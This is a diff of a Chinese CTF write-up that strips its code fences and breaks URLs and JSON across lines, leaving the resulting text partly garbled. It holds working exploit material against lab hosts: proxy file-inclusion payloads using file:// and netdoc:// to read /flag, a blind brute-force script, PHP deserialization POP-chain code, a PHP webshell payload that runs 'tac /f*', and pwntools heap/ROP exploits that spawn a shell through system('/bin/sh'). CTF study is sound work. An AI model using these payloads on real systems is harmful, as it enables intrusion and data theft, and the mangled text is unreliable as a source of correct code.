@@ -213,12 +213,16 @@ Spring Boot信息泄露 netdoc协议文件包含
 
 点击得到一个api-docs路由文件
 
-{"openapi":"3.0.3","info":{"title":"Challenge","description":"Proxy API","version":"1.0"},"servers":[{"url":"http://172.10.0.3:8080","description":"Inferred Url"}],"tags":[{"name":"Proxy","description":"Proxy Controller"}],"paths":{"/proxy/url":{"get":{"tags":["Proxy"],"summary":"proxy for the url which submitted by user","operationId":"proxyUsingGET","parameters":[{"name":"url","in":"query","description":"url","required":false,"style":"form","schema":{"type":"string"}}],"responses":{"200":{"description":"OK","content":{"*/*":{"schema":{"type":"string","format":"byte"}}}},"401":{"description":"Unauthorized"},"403":{"description":"Forbidden"},"404":{"description":"Not Found"}}}}},"components":{}}
+{"openapi":"3.0.3","info":{"title":"Challenge","description":"Proxy API","version":"1.0"},"servers":[{"url":"http://172.10.0.3:
+8080","description":"Inferred Url"}],"tags":[{"name":"Proxy","description":"Proxy Controller"}],"paths":{"/proxy/url":{"get":{"tags":["Proxy"],"summary":"proxy for the url which submitted by user","operationId":"proxyUsingGET","parameters":[{"name":"url","in":"query","description":"url","required":
+false,"style":"form","schema":{"type":"string"}}],"responses":{"200":{"description":"OK","content":{"*/*":{"schema":{"type":"string","format":"byte"}}}},"401":{"description":"Unauthorized"},"403":{"description":"Forbidden"},"404":{"description":"Not Found"}}}}},"components":{}}
 
 继续测试，发现是存在文件包含的，exp如下
 
-/proxy/url?url=url:file:///flag%23.html  # 截断绕过
-/proxy/url?url=url:netdoc:///flag%23.html
+/proxy/url?url=url:
+file:///flag%23.html  # 截断绕过
+/proxy/url?url=url:
+netdoc:///flag%23.html
 
 Web-Tera
 
@@ -236,7 +240,8 @@ import string
 import requests
 import time
 
-url = "http://172.10.0.3:8081/"
+url = "http://172.10.0.3:
+8081/"
 str = string.hexdigits + "-+,"
 zhi = "^fla.."
 
@@ -794,17 +799,7 @@ if (isset($a)){
     unserialize(nonono($a));
 }
 ?>
-```
-
-
-
-```
 POP链子
-```
-
-
-
-```
 <?php
 show_source(__FILE__);
 error_reporting(0);
@@ -901,35 +896,20 @@ echo serialize($a);
 //    unserialize(nonono($a));
 //}
 ?>
-```
-
-
-
-```
 Spring Boot信息泄露 netdoc协议文件包含
-```
-
-
-
-```
-{"openapi":"3.0.3","info":{"title":"Challenge","description":"Proxy API","version":"1.0"},"servers":[{"url":"http://172.10.0.3:8080","description":"Inferred Url"}],"tags":[{"name":"Proxy","description":"Proxy Controller"}],"paths":{"/proxy/url":{"get":{"tags":["Proxy"],"summary":"proxy for the url which submitted by user","operationId":"proxyUsingGET","parameters":[{"name":"url","in":"query","description":"url","required":false,"style":"form","schema":{"type":"string"}}],"responses":{"200":{"description":"OK","content":{"*/*":{"schema":{"type":"string","format":"byte"}}}},"401":{"description":"Unauthorized"},"403":{"description":"Forbidden"},"404":{"description":"Not Found"}}}}},"components":{}}
-```
-
-
-
-```
-/proxy/url?url=url:file:///flag%23.html  # 截断绕过
-/proxy/url?url=url:netdoc:///flag%23.html
-```
-
-
-
-```
+{"openapi":"3.0.3","info":{"title":"Challenge","description":"Proxy API","version":"1.0"},"servers":[{"url":"http://172.10.0.3:
+8080","description":"Inferred Url"}],"tags":[{"name":"Proxy","description":"Proxy Controller"}],"paths":{"/proxy/url":{"get":{"tags":["Proxy"],"summary":"proxy for the url which submitted by user","operationId":"proxyUsingGET","parameters":[{"name":"url","in":"query","description":"url","required":
+false,"style":"form","schema":{"type":"string"}}],"responses":{"200":{"description":"OK","content":{"*/*":{"schema":{"type":"string","format":"byte"}}}},"401":{"description":"Unauthorized"},"403":{"description":"Forbidden"},"404":{"description":"Not Found"}}}}},"components":{}}
+/proxy/url?url=url:
+file:///flag%23.html  # 截断绕过
+/proxy/url?url=url:
+netdoc:///flag%23.html
 import string
 import requests
 import time
 
-url = "http://172.10.0.3:8081/"
+url = "http://172.10.0.3:
+8081/"
 str = string.hexdigits + "-+,"
 zhi = "^fla.."
 
@@ -949,11 +929,6 @@ while True:
             break
         if i == "+":
             break
-```
-
-
-
-```
 import requests
 import string
 
@@ -973,11 +948,6 @@ for i in range(100):
             path += s
             print(path)
             break
-```
-
-
-
-```
 <?php
 highlight_file(__FILE__);
 error_reporting(0);
@@ -1008,21 +978,11 @@ if(isset($_GET['username'])){
         system('/bin/rm -rf ' . $sandbox);
     }
 }
-```
-
-
-
-```
 backdoor_00fbc51dcdf9eef767597fd26119a894.php?username=admin&title[]=2.php&data[]=<?=`tac%20/f*`;
-```
-
-
-
-```
 from pwn import*
 context(arch='amd64', os='linux',log_level="debug")
 context.terminal=["wt.exe","wsl.exe"]
-#libc = ELF("../libc/")
+    #libc = ELF("../libc/")
 libc = ELF("./libc-2.27.so")
 """""
 def xxx():
@@ -1090,15 +1050,10 @@ sleep(0.2)
 # sleep(2)
 p.send("x00")
 p.interactive()
-```
-
-
-
-```
 from pwn import*
 context(arch='i386', os='linux',log_level="debug")
 context.terminal=["wt.exe","wsl.exe"]
-#libc = ELF("../libc/")
+    #libc = ELF("../libc/")
 libc = ELF("./libc.so.6")
 """""
 def xxx():
@@ -1193,15 +1148,10 @@ add(0x408,"An")
 # sleep(2)
 add(0x408,p64(0)+p64(one_gadget)+b" 0"*0x200+b"n")
 p.interactive()
-```
-
-
-
-```
 from pwn import*
 context(arch='i386', os='linux',log_level="debug")
 context.terminal=["wt.exe","wsl.exe"]
-#libc = ELF("../libc/")
+    #libc = ELF("../libc/")
 libc = ELF("./libc.so.6")
 """""
 def xxx():
@@ -1295,11 +1245,6 @@ add(0x408,"An")
 # sleep(2)
 add(0x408,p64(0)+p64(ret)+p64(pop_rdi)+p64(binsh) + p64(system)+b"n")
 p.interactive()
-```
-
-
-
-```
 def KSA(key):
     key_length = len(key)
     S = list(range(256))
@@ -1340,11 +1285,6 @@ if __name__ == '__main__':
     for b in plaintext:
         ciphertext.append(chr(b ^ next(keystream)))
     print("".join(ciphertext))
-```
-
-
-
-```
 flag{th3_p3fi15_1s_v3ry_nicccccc!}
 ```
 
